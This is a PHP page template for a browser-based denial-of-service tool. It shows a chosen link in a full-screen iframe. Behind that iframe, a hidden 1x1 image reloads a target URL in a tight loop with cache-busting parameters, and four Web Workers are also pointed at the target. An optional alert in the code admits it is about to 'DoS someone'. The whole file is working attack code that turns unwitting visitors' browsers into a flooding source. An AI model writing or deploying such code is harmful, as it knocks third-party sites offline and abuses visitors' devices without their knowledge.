<?php
if(isset($title)&&isset($target)&&isset($link)){
echo '<html>
<head>
<title>'.$title.'</title>';
if($WARNUSERS){
    echo '<script>alert("WARNING: you are about to DoS someone. Exit if you don\'t want to.';
}

echo "<script type='text/javascript'>

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-15919924-3']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>";

echo '<style>
#page {width: 100%; height: 100%;}
body{margin:0}
</style>
<script type="text/javascript">

function make_url(base){
    var date = new Date();
    if(base.indexOf("?")==-1){
        return base+"?v="+date.getTime();
    } else {
        return base+"&v="+date.getTime();
    }
}

function asdf()
{

var i = document.getElementsByTagName("img")[0];
i.src = make_url("'.$target.'");
window.status="asdf";
}

var workers = new Array();
var i=0;
var noWorker = typeof Worker == "undefined" ? true : false;  
if(!noWorker) {  
	try { 
		for(i=0;i<=3;i++){
			workers[i]=new Worker("worker.js");
			workers[i].postMessage("'.$target.'");
		}
	} catch(e) {  
    	 e = e + "";
	alert(e);
     	if(e.indexOf("Worker is not enabled") != -1) {  
         noWorker = true;
	
     }
}
}
</script>

</head>
<body>
<img style="display:block;position:absolute;" src="'.$target.'" onload="asdf()" onerror="asdf()" width="1" height="1">
<iframe id="page" name="page" src="'.$link.'" frameborder="0" noresize="noresize" style="overflow:visible"></iframe>
</body>
</html>';
}
?>
